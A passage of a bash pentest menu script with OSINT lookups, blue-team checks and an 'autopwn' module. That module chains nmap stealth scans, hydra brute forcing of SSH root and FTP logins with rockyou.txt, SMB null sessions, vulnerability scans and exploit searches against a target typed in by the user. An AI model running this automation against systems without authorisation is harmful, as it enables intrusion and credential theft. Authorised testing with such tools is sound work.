    [[ "$shodan_key" == "99" ]] && return
    echo ""
    
    local query=$(read_input "Enter search query: ")
    [[ -z "$query" ]] && return
    [[ "$query" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/shodan_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Searching Shodan...${NC}"
    python3 << EOF | tee "$output_file"
import shodan
try:
    api = shodan.Shodan('$shodan_key')
    results = api.search('$query')
    print(f"Total results: {results['total']}")
    for result in results['matches'][:10]:
        print(f"IP: {result['ip_str']}")
        print(f"Port: {result['port']}")
        print(f"Org: {result.get('org', 'n/a')}")
        print(f"Data: {result['data'][:200]}...")
        print("-" * 40)
except Exception as e:
    print(f"Error: {e}")
EOF

    echo -e "${GREEN}[+] Shodan results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

dns_enum_osint() {
    show_menu "DNS Enumeration" "Enumerate DNS records and configurations"
    
    local domain=$(read_input "Enter domain: ")
    [[ -z "$domain" ]] && return
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/dns_${domain}_$timestamp.txt"
    
    echo "=== DNS Enumeration for $domain ===" | tee "$output_file"
    echo "" | tee -a "$output_file"
    
    # NS lookup
    echo "--- Name Servers ---" | tee -a "$output_file"
    host -t ns "$domain" | tee -a "$output_file"
    
    # MX lookup
    echo "" | tee -a "$output_file"
    echo "--- Mail Servers ---" | tee -a "$output_file"
    host -t mx "$domain" | tee -a "$output_file"
    
    # Zone transfer attempt
    echo "" | tee -a "$output_file"
    echo "--- Zone Transfer Attempt ---" | tee -a "$output_file"
    for ns in $(host -t ns "$domain" | awk '{print $4}'); do
        echo "Trying NS: $ns" | tee -a "$output_file"
        host -l "$domain" "$ns" 2>&1 | tee -a "$output_file" || true
    done
    
    echo -e "${GREEN}[+] DNS enumeration saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

whois_lookup() {
    show_menu "WHOIS Lookup" "Query domain/IP registration information"
    
    local target=$(read_input "Enter domain or IP: ")
    [[ -z "$target" ]] && return
    [[ "$target" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/whois_${target}_$timestamp.txt"
    
    whois "$target" | tee "$output_file"
    
    echo -e "${GREEN}[+] WHOIS saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

full_osint_report() {
    show_menu "Full OSINT Report" "Comprehensive intelligence gathering"
    
    local domain=$(read_input "Enter target domain: ")
    [[ -z "$domain" ]] && return
    [[ "$domain" == "99" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_dir="$OSINT_DIR/full_report_${domain}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Running comprehensive OSINT... This may take a few minutes.${NC}"
    
    # Domain info
    echo "[1/6] Gathering domain information..."
    host "$domain" > "$report_dir/dns_basic.txt" 2>&1
    host -t mx "$domain" >> "$report_dir/dns_basic.txt" 2>&1
    host -t ns "$domain" >> "$report_dir/dns_basic.txt" 2>&1
    whois "$domain" > "$report_dir/whois.txt" 2>&1
    
    # Subdomains
    echo "[2/6] Enumerating subdomains..."
    for sub in www mail ftp admin portal api dev test staging shop blog vpn remote mobile; do
        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | sort -u > "$report_dir/cert_transparency.txt" || true
    
    # Email harvesting
    echo "[3/6] Searching for emails..."
    if command -v theharvester &>/dev/null; then
        theharvester -d "$domain" -b google,linkedin,yahoo 2>/dev/null | tail -100 > "$report_dir/emails.txt" || true
    fi
    
    # Web technologies
    echo "[4/6] Identifying web technologies..."
    curl -s -I "http://$domain" > "$report_dir/web_headers.txt" 2>&1 || true
    
    # IP info
    echo "[5/6] Gathering IP information..."
    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
    [[ -n "$ip" ]] && whois "$ip" > "$report_dir/ip_whois.txt" 2>&1 || true
    
    # Generate summary report
    echo "[6/6] Generating summary..."
    cat > "$report_dir/SUMMARY.txt" << EOF
OSINT Report for: $domain
Generated: $(date)
Report ID: $timestamp

=== Files in this report ===
- dns_basic.txt: DNS A, MX, NS records
- whois.txt: WHOIS information for domain
- subdomains.txt: Discovered subdomains
- cert_transparency.txt: Certificate transparency logs
- emails.txt: Harvested email addresses
- web_headers.txt: HTTP headers
- ip_whois.txt: WHOIS for IP address

=== Quick Stats ===
EOF

    local subdomain_count=$(grep -c "has address" "$report_dir/subdomains.txt" 2>/dev/null || echo "0")
    local email_count=$(grep -c "@" "$report_dir/emails.txt" 2>/dev/null || echo "0")
    
    echo "Subdomains found: $subdomain_count" >> "$report_dir/SUMMARY.txt"
    echo "Emails found: $email_count" >> "$report_dir/SUMMARY.txt"
    echo "IP Address: $ip" >> "$report_dir/SUMMARY.txt"
    
    echo -e "${GREEN}[+] Full OSINT report complete: $report_dir${NC}"
    cat "$report_dir/SUMMARY.txt"
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# BLUETEAM MODULE
# =============================================================================

blueteam_menu() {
    while true; do
        show_menu "Blue Team & Defense" "1) Secure Password Generator
2) Virus Scan (ClamAV)
3) Rootkit Detection (rkhunter/chkrootkit)
4) File Integrity Check
5) Network Connection Monitor
6) System Hardening Check
0) Back to Main Menu"
        
        local bt_choice=$(read_input "Select option: ")
        
        case $bt_choice in
            1) secure_password_gen ;;
            2) virus_scan ;;
            3) rootkit_detection ;;
            4) file_integrity_check ;;
            5) network_monitor ;;
            6) hardening_check ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

secure_password_gen() {
    show_menu "Secure Password Generator" "Generate secure passwords and passphrases"
    
    show_menu "Password Options" "1) Generate single password
2) Generate multiple passwords
3) Generate passphrase (diceware style)
4) Check password strength
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    case $choice in
        1)
            local length=$(read_input "Enter password length (default 16): ")
            [[ "$length" == "99" ]] && return
            length=${length:-16}
            
            # Generate secure password
            local password=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
            echo -e "${GREEN}[+] Generated Password: $password${NC}"
            
            local save=$(read_input "Save to file? (y/n): ")
            [[ "$save" == "y" ]] && echo "$password" >> "$RESULTS_DIR/blueteam/generated_passwords.txt" && \
                echo -e "${GREEN}[+] Saved to generated_passwords.txt${NC}"
            ;;
        2)
            local count=$(read_input "How many passwords? ")
            [[ "$count" == "99" ]] && return
            local length=$(read_input "Password length? ")
            [[ "$length" == "99" ]] && return
            length=${length:-16}
            
            timestamp=$(date +%Y%m%d_%H%M%S)
            local output_file="$RESULTS_DIR/blueteam/passwords_$timestamp.txt"
            
            echo "Generated Passwords ($(date))" > "$output_file"
            echo "============================" >> "$output_file"
            
            for i in $(seq 1 "$count"); do
                local pwd=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
                echo "$i) $pwd" | tee -a "$output_file"
            done
            
            echo -e "${GREEN}[+] Passwords saved to: $output_file${NC}"
            ;;
        3)
            local words=$(read_input "Number of words in passphrase (default 6): ")
            [[ "$words" == "99" ]] && return
            words=${words:-6}
            
            if [[ -f "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ]]; then
                local passphrase=$(shuf -n "$words" "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" | tr '\n' '-' | sed 's/-$//')
                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
            else
                # Fallback to random words
                local passphrase=$(cat /usr/share/dict/words 2>/dev/null | shuf -n "$words" | tr '\n' '-' | sed 's/-$//' || \
                    openssl rand -base64 32 | tr -dc 'a-z' | fold -w 5 | head -$words | tr '\n' '-' | sed 's/-$//')
                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
            fi
            ;;
        4)
            echo -n "Enter password to check: "
            read -s password
            echo ""
            
            local length=${#password}
            local score=0
            
            [[ $length -ge 12 ]] && ((score+=2))
            [[ $length -ge 16 ]] && ((score+=2))
            [[ "$password" =~ [A-Z] ]] && ((score+=1))
            [[ "$password" =~ [a-z] ]] && ((score+=1))
            [[ "$password" =~ [0-9] ]] && ((score+=1))
            [[ "$password" =~ [\!\@\#\$\%\^\&\*] ]] && ((score+=2))

            echo "Length: $length"
            echo "Score: $score/9"
            
            if [[ $score -ge 7 ]]; then
                echo -e "${GREEN}[+] Strong password${NC}"
            elif [[ $score -ge 4 ]]; then
                echo -e "${YELLOW}[~] Moderate password${NC}"
            else
                echo -e "${RED}[!] Weak password${NC}"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

virus_scan() {
    check_install clamav clamscan
    
    show_menu "Virus Scanner (ClamAV)" "Scan for malware and viruses"
    
    # Update virus database
    echo -e "${YELLOW}[*] Updating virus database...${NC}"
    freshclam 2>/dev/null || echo -e "${YELLOW}[!] Could not update database (may need to run freshclam manually)${NC}"
    
    local scan_path=$(read_input "Enter path to scan (file or directory): ")
    [[ -z "$scan_path" ]] && return
    [[ "$scan_path" == "99" ]] && return
    
    if [[ ! -e "$scan_path" ]]; then
        echo -e "${RED}[!] Path not found${NC}"
        return
    fi
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$RESULTS_DIR/blueteam/virus_scan_$timestamp.log"
    
    echo -e "${YELLOW}[*] Scanning...${NC}"
    
    if [[ -d "$scan_path" ]]; then
        clamscan -r --infected --log="$log_file" "$scan_path"
    else
        clamscan --infected --log="$log_file" "$scan_path"
    fi
    
    echo -e "${GREEN}[+] Scan complete. Log saved to: $log_file${NC}"
    
    # Show summary
    grep "Infected files:" "$log_file" 2>/dev/null || echo "Scan finished."
    
    echo -n "Press Enter to continue..."
    read
}

rootkit_detection() {
    show_menu "Rootkit Detection" "Scan for rootkits and backdoors"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$RESULTS_DIR/blueteam/rootkit_scan_$timestamp"
    create_dir "$output_dir"
    
    show_menu "Rootkit Scanner" "1) Run rkhunter
2) Run chkrootkit
3) Run both
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    if [[ "$choice" == "1" || "$choice" == "3" ]]; then
        if command -v rkhunter &>/dev/null; then
            echo -e "${YELLOW}[*] Running rkhunter...${NC}"
            rkhunter --check --sk --logfile "$output_dir/rkhunter.log" 2>&1 | tail -100
        else
            echo -e "${RED}[!] rkhunter not installed${NC}"
        fi
    fi
    
    if [[ "$choice" == "2" || "$choice" == "3" ]]; then
        if command -v chkrootkit &>/dev/null; then
            echo -e "${YELLOW}[*] Running chkrootkit...${NC}"
            chkrootkit 2>&1 | tee "$output_dir/chkrootkit.log" | tail -50
        else
            echo -e "${RED}[!] chkrootkit not installed${NC}"
        fi
    fi
    
    echo -e "${GREEN}[+] Rootkit scan complete. Results in: $output_dir${NC}"
    echo -n "Press Enter to continue..."
    read
}

file_integrity_check() {
    show_menu "File Integrity Check" "Monitor file changes and integrity"
    
    local dir_path=$(read_input "Enter directory to monitor: ")
    [[ -z "$dir_path" ]] && return
    [[ "$dir_path" == "99" ]] && return
    [[ ! -d "$dir_path" ]] && echo -e "${RED}[!] Directory not found${NC}" && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local baseline_file="$RESULTS_DIR/blueteam/baseline_${dir_path//\//_}_$timestamp.txt"
    local current_file="$RESULTS_DIR/blueteam/current_${dir_path//\//_}_$timestamp.txt"
    
    show_menu "Integrity Options" "1) Create baseline
2) Check against existing baseline
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    if [[ "$choice" == "1" ]]; then
        echo -e "${YELLOW}[*] Creating baseline...${NC}"
        find "$dir_path" -type f -exec sha256sum {} \; > "$baseline_file" 2>/dev/null
        echo -e "${GREEN}[+] Baseline saved to: $baseline_file${NC}"
        echo "Keep this file secure for future integrity checks."
    elif [[ "$choice" == "2" ]]; then
        local baseline=$(read_input "Enter baseline file path: ")
        [[ "$baseline" == "99" ]] && return
        
        [[ ! -f "$baseline" ]] && echo -e "${RED}[!] Baseline file not found${NC}" && return
        
        echo -e "${YELLOW}[*] Checking integrity...${NC}"
        find "$dir_path" -type f -exec sha256sum {} \; > "$current_file" 2>/dev/null
        
        local diff_output=$(diff "$baseline" "$current_file")
        
        if [[ -z "$diff_output" ]]; then
            echo -e "${GREEN}[+] No changes detected. Integrity verified.${NC}"
        else
            echo -e "${RED}[!] CHANGES DETECTED:${NC}"
            echo "$diff_output"
            echo ""
            echo -e "${YELLOW}[*] Added files:${NC}"
            comm -13 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}')
            echo ""
            echo -e "${YELLOW}[*] Modified files:${NC}"
            comm -12 <(sort "$baseline" | awk '{print $2}') <(sort "$current_file" | awk '{print $2}') | while read f; do
                grep "$f" "$baseline" > /tmp/baseline_hash 2>/dev/null
                grep "$f" "$current_file" > /tmp/current_hash 2>/dev/null
                diff /tmp/baseline_hash /tmp/current_hash > /dev/null || echo "$f"
            done
        fi
        
        rm -f "$current_file"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

network_monitor() {
    show_menu "Network Connection Monitor" "Monitor active network connections"
    
    show_menu "Monitor Options" "1) Show active connections
2) Monitor connections in real-time
3) Show listening ports
4) Show established connections
0) Back to main menu"
    
    local choice=$(read_input "Choice: ")
    [[ "$choice" == "0" ]] && return
    [[ "$choice" == "99" ]] && return
    
    case $choice in
        1)
            echo -e "${CYAN}=== Active Connections ===${NC}"
            netstat -tulpn 2>/dev/null || ss -tulpn
            ;;
        2)
            echo -e "${YELLOW}[*] Monitoring connections (Ctrl+C to stop)...${NC}"
            watch -n 1 'netstat -tulpn 2>/dev/null || ss -tulpn'
            ;;
        3)
            echo -e "${CYAN}=== Listening Ports ===${NC}"
            netstat -tlnp 2>/dev/null || ss -tlnp
            ;;
        4)
            echo -e "${CYAN}=== Established Connections ===${NC}"
            netstat -tnp 2>/dev/null | grep ESTABLISHED || ss -tnp | grep ESTAB
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

hardening_check() {
    show_menu "System Hardening Check" "Check system security configuration"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_file="$RESULTS_DIR/blueteam/hardening_$timestamp.txt"
    
    echo "System Hardening Report - $(date)" | tee "$report_file"
    echo "================================" | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check SSH settings
    echo "--- SSH Configuration ---" | tee -a "$report_file"
    if [[ -f /etc/ssh/sshd_config ]]; then
        grep -E "^PermitRootLogin|^PasswordAuthentication|^Port" /etc/ssh/sshd_config | tee -a "$report_file"
    else
        echo "SSH config not found" | tee -a "$report_file"
    fi
    echo "" | tee -a "$report_file"
    
    # Check firewall status
    echo "--- Firewall Status ---" | tee -a "$report_file"
    ufw status 2>/dev/null | head -5 | tee -a "$report_file" || \
    iptables -L -n 2>/dev/null | head -10 | tee -a "$report_file" || \
    echo "No firewall detected" | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for unnecessary services
    echo "--- Running Services ---" | tee -a "$report_file"
    systemctl list-units --type=service --state=running 2>/dev/null | head -20 | tee -a "$report_file" || \
    service --status-all 2>/dev/null | grep + | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for SUID files
    echo "--- SUID Files (potential privilege escalation) ---" | tee -a "$report_file"
    find / -perm -4000 -type f 2>/dev/null | head -20 | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check for world-writable files
    echo "--- World-Writable Files ---" | tee -a "$report_file"
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    
    # Check users
    echo "--- User Accounts ---" | tee -a "$report_file"
    awk -F: '$3 >= 1000 {print $1}' /etc/passwd | tee -a "$report_file"
    echo "" | tee -a "$report_file"
    echo "Users with no password:" | tee -a "$report_file"
    awk -F: '($2 == "") {print $1}' /etc/shadow 2>/dev/null | tee -a "$report_file" || echo "None found" | tee -a "$report_file"
    
    echo "" | tee -a "$report_file"
    echo "--- Kernel Parameters ---" | tee -a "$report_file"
    sysctl -a 2>/dev/null | grep -E "rp_filter|syncookies|redirect" | tee -a "$report_file"
    
    echo "" | tee -a "$report_file"
    echo -e "${GREEN}[+] Hardening report saved to: $report_file${NC}"
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# AUTOPWN MODULE - ENHANCED WITH LOADING BAR
# =============================================================================

autopwn_menu() {
    show_menu "Autopwn - Automated Exploitation" "1) Autopwn IP Address (Standard)
2) Autopwn IP Address (Stealth Mode)
3) Autopwn IP Address (Aggressive)
4) Autopwn URL/Domain (Standard)
5) Autopwn URL/Domain (Deep Scan)
6) Autopwn with Custom Parameters
0) Back to Main Menu"
    
    local choice=$(read_input "Select option: ")
    
    case $choice in
        1) autopwn_ip "standard" ;;
        2) autopwn_ip "stealth" ;;
        3) autopwn_ip "aggressive" ;;
        4) autopwn_url "standard" ;;
        5) autopwn_url "deep" ;;
        6) autopwn_custom ;;
        0) return ;;
        *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
    esac
}

autopwn_ip() {
    local mode="${1:-standard}"
    
    show_menu "Autopwn IP Address ($mode)" "Automated exploitation against IP addresses"
    
    local target_ip=$(read_input "Enter target IP: ")
    [[ -z "$target_ip" ]] && return
    [[ "$target_ip" == "99" ]] && return
    
    # Additional options based on mode
    local nmap_speed="-T4"
    local nmap_scan="-sS"
    local nmap_scripts="--script vuln"
    local deep_scan=false
    
    case $mode in
        "stealth")
            nmap_speed="-T2"
            nmap_scan="-sS -f --randomize-hosts"
            echo -e "${YELLOW}[*] Stealth mode: Slow scan with fragmentation${NC}"
            ;;
        "aggressive")
            nmap_speed="-T5"
            nmap_scan="-sS -A"
            deep_scan=true
            echo -e "${YELLOW}[*] Aggressive mode: Fast comprehensive scan${NC}"
            ;;
    esac
    
    # Custom port range option
    local port_range=""
    local custom_ports=$(read_input "Enter specific ports (e.g., 22,80,443 or press Enter for all): ")
    if [[ -n "$custom_ports" && "$custom_ports" != "99" ]]; then
        port_range="-p $custom_ports"
    else
        port_range="-p-"
    fi
    
    [[ "$custom_ports" == "99" ]] && return
    
    # Threading options
    local threads="50"
    local custom_threads=$(read_input "Enter max threads (default: 50): ")
    [[ "$custom_threads" == "99" ]] && return
    [[ -n "$custom_threads" ]] && threads="$custom_threads"
    
    # Timeout setting
    local timeout="300"
    local custom_timeout=$(read_input "Enter scan timeout in seconds (default: 300): ")
    [[ "$custom_timeout" == "99" ]] && return
    [[ -n "$custom_timeout" ]] && timeout="$custom_timeout"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_dir="$RESULTS_DIR/autopwn/ip_${target_ip//./_}_${mode}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Starting automated exploitation against $target_ip${NC}"
    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
    local confirm=$(read_input "Continue? (y/n): ")
    [[ "$confirm" != "y" ]] && return
    
    # Total steps for progress bar
    local total_steps=7
    local current_step=0
    
    # Step 1: Port Scan with custom parameters
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Port Scanning"
    echo ""
    timeout "$timeout" nmap $nmap_scan $nmap_speed $port_range --open --max-retries 2 --max-rtt-timeout 500ms \
        -sV -O --version-intensity 5 "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null || \
    timeout "$timeout" nmap -sT -sV -p- --open "$target_ip" -oA "$report_dir/nmap_full" 2>/dev/null
    
    # Parse open ports
    local open_ports=$(grep -oP '\d+/open' "$report_dir/nmap_full.nmap" 2>/dev/null | cut -d'/' -f1 | tr '\n' ',')
    [[ -z "$open_ports" ]] && open_ports="1-65535"
    
    echo "Open ports: $open_ports"
    
    # Step 2: Service enumeration
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Service Enumeration"
    echo ""
    
    # Check for web services
    if grep -q "80/open\|443/open\|8080/open\|8443/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] Web services detected, running web enumeration..."
        
        # Determine web port
        local web_port=$(grep -oP '\d+/open' "$report_dir/nmap_full.nmap" | grep -E "80|443|8080|8443" | head -1 | cut -d'/' -f1)
        
        # Nikto scan
        timeout 300 nikto -h "$target_ip:$web_port" -output "$report_dir/nikto.txt" 2>/dev/null || true
        
        # Gobuster if wordlists exist
        if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
            timeout 300 gobuster dir -u "http://$target_ip:$web_port" \
                -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
                -o "$report_dir/directories.txt" -t "$threads" 2>/dev/null || true
        fi
        
        # Whatweb fingerprinting
        whatweb "http://$target_ip:$web_port" > "$report_dir/whatweb.txt" 2>/dev/null || true
    fi
    
    # Check for SMB
    if grep -q "445/open\|139/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] SMB detected, running enumeration..."
        timeout 300 enum4linux-ng -A "$target_ip" -oA "$report_dir/smb_enum" 2>/dev/null || \
        timeout 300 enum4linux -a "$target_ip" > "$report_dir/smb_enum.txt" 2>/dev/null || true
        
        # Check for null sessions
        smbclient -L "//$target_ip/" -N > "$report_dir/smb_null.txt" 2>&1 || true
    fi
    
    # Check for SSH
    if grep -q "22/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] SSH detected, checking for weak credentials..."
        timeout 300 hydra -l root -P "$WORDLISTS_DIR/rockyou.txt" "$target_ip" ssh -t 4 -o "$report_dir/ssh_brute.txt" 2>/dev/null || true
        
        # SSH version check
        ssh -V 2>&1 | head -1 > "$report_dir/ssh_version.txt"
    fi
    
    # Check for FTP
    if grep -q "21/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] FTP detected, checking for anonymous access..."
        echo "anonymous" | timeout 30 ftp -n "$target_ip" > "$report_dir/ftp_anon.txt" 2>&1 || true
        
        # FTP brute force
        timeout 300 hydra -l anonymous -P "$WORDLISTS_DIR/rockyou.txt" "$target_ip" ftp -o "$report_dir/ftp_brute.txt" 2>/dev/null || true
    fi
    
    # Check for SNMP
    if grep -q "161/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] SNMP detected, enumerating..."
        timeout 60 snmpwalk -c public -v1 "$target_ip" > "$report_dir/snmp.txt" 2>/dev/null || true
    fi
    
    # Check for MySQL/MSSQL/PostgreSQL
    if grep -q "3306/open\|1433/open\|5432/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
        echo "  [*] Database detected..."
        for db_port in 3306 1433 5432; do
            if grep -q "${db_port}/open" "$report_dir/nmap_full.nmap" 2>/dev/null; then
                case $db_port in
                    3306) echo "MySQL found on port $db_port" >> "$report_dir/databases.txt" ;;
                    1433) echo "MSSQL found on port $db_port" >> "$report_dir/databases.txt" ;;
                    5432) echo "PostgreSQL found on port $db_port" >> "$report_dir/databases.txt" ;;
                esac
            fi
        done
    fi
    
    # Step 3: Vulnerability scan (if not stealth)
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Vulnerability Scanning"
    echo ""
    if [[ "$mode" != "stealth" ]]; then
        if command -v nmap &>/dev/null; then
            timeout 600 nmap --script vuln -p "$open_ports" "$target_ip" -oN "$report_dir/vuln_scan.txt" 2>/dev/null || true
        fi
    else
        echo "Skipping vulnerability scan (stealth mode)..."
    fi
    
    # Step 4: Search for exploits
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Exploit Search"
    echo ""
    local services=$(grep -oP '([a-zA-Z0-9_-]+) [0-9.]+' "$report_dir/nmap_full.nmap" 2>/dev/null | head -10)
    for service in $services; do
        searchsploit "$service" 2>/dev/null | head -5 >> "$report_dir/exploits.txt" || true
    done
    
    # Step 5: Nuclei scan (if installed and not stealth)
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Nuclei Scan"
    echo ""
    if [[ "$mode" != "stealth" ]] && command -v nuclei &>/dev/null; then
        timeout 300 nuclei -u "$target_ip" -o "$report_dir/nuclei.txt" 2>/dev/null || true
    else
        echo "Skipping Nuclei scan..."
    fi
    
    # Step 6: Generate comprehensive report
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Generating Report"
    echo ""
    
    # Calculate scan statistics
    local port_count=$(grep -c "/open" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "0")
    local vuln_count=$(grep -c "CVE\|VULNERABLE" "$report_dir/vuln_scan.txt" 2>/dev/null || echo "0")
    
    cat > "$report_dir/AUTOPWN_REPORT.txt" << EOF
╔═══════════════════════════════════════════════════════════╗
║              AUTOPWN REPORT - $mode MODE                    ║
╚═══════════════════════════════════════════════════════════╝

Target: $target_ip
Date: $(date)
Scan ID: $timestamp
Mode: $mode
Ports Scanned: $port_range
Threads: $threads
Timeout: ${timeout}s

=== SCAN STATISTICS ===
Open Ports Found: $port_count
Vulnerabilities Detected: $vuln_count

=== OPEN PORTS ===
$(grep -E "^[0-9]+/open" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")

=== SERVICES ===
$(grep -E "^[0-9]+/(tcp|udp)" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")

=== OPERATING SYSTEM ===
$(grep -E "OS details|Running:" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "OS detection failed")

=== FILES GENERATED ===
$(ls -la "$report_dir/" 2>/dev/null)

=== POTENTIAL VULNERABILITIES ===
$(grep -E "CVE|VULNERABLE|Exploit" "$report_dir/vuln_scan.txt" 2>/dev/null | head -20 || echo "See vuln_scan.txt")

=== EXPLOIT SUGGESTIONS ===
$(cat "$report_dir/exploits.txt" 2>/dev/null | head -10 || echo "None found")

=== NEXT STEPS ===
1. Review nmap_full.nmap for service versions
2. Check smb_enum for share access
3. Review vuln_scan.txt for vulnerabilities
4. Check exploits.txt for potential exploits
5. If web services found, check directories.txt for hidden paths
6. Review nuclei.txt for additional findings (if scanned)

=== RECOMMENDATIONS ===
$(if [[ $vuln_count -gt 0 ]]; then echo "[!] $vuln_count vulnerabilities found - prioritize patching"; fi)
$(if [[ -f "$report_dir/ssh_brute.txt" ]]; then echo "[*] Check ssh_brute.txt for weak credentials"; fi)
$(if [[ -f "$report_dir/ftp_anon.txt" ]]; then echo "[*] Check ftp_anon.txt for anonymous access"; fi)

Report saved to: $report_dir/
EOF

    # Step 7: Complete
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Complete"
    echo ""
    echo ""
    echo -e "${GREEN}[+] Autopwn complete! Report saved to: $report_dir/AUTOPWN_REPORT.txt${NC}"
    echo ""
    cat "$report_dir/AUTOPWN_REPORT.txt"
    
    # Auto-open report option
    local view_report=$(read_input "View full report now? (y/n): ")
    [[ "$view_report" == "y" ]] && less "$report_dir/AUTOPWN_REPORT.txt"
    
    echo -n "Press Enter to continue..."
    read
}

autopwn_url() {
    local mode="${1:-standard}"
    
    show_menu "Autopwn URL/Domain ($mode)" "Automated web exploitation"
    
    local target_url=$(read_input "Enter target URL (e.g., http://target.com): ")
    [[ -z "$target_url" ]] && return
    [[ "$target_url" == "99" ]] && return
    
    # Ensure URL has protocol
    [[ ! "$target_url" =~ ^http ]] && target_url="http://$target_url"
    
    # Crawl depth based on mode
    local crawl_depth="2"
    [[ "$mode" == "deep" ]] && crawl_depth="5"
    
    # SQLMap level based on mode
    local sqlmap_level="1"
    local sqlmap_risk="1"
    [[ "$mode" == "deep" ]] && sqlmap_level="3" && sqlmap_risk="2"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local domain=$(echo "$target_url" | sed -E 's|https?://||' | cut -d'/' -f1)
    local report_dir="$RESULTS_DIR/autopwn/url_${domain}_${mode}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Starting automated web exploitation against $target_url${NC}"
    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
    local confirm=$(read_input "Continue? (y/n): ")
    [[ "$confirm" != "y" ]] && return
    
    local total_steps=8
    local current_step=0
    
    # Step 1: Initial recon
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Initial Reconnaissance"
    echo ""
    curl -s -I "$target_url" > "$report_dir/headers.txt" 2>&1 || true
    whatweb "$target_url" > "$report_dir/whatweb.txt" 2>&1 || true
    wafw00f "$target_url" > "$report_dir/waf_detect.txt" 2>&1 || true
    
    # Step 2: DNS/Domain info
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "DNS Information"
    echo ""
    host "$domain" > "$report_dir/dns.txt" 2>&1 || true
    host -t mx "$domain" >> "$report_dir/dns.txt" 2>&1 || true
    whois "$domain" > "$report_dir/whois.txt" 2>&1 || true
    
    # Step 3: Subdomain enumeration
    ((current_step++))
    show_autopwn_progress "$current_step" "$total_steps" "Subdomain Enumeration"
    echo ""
    for sub in www mail ftp admin portal api dev test staging shop blog; do
        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
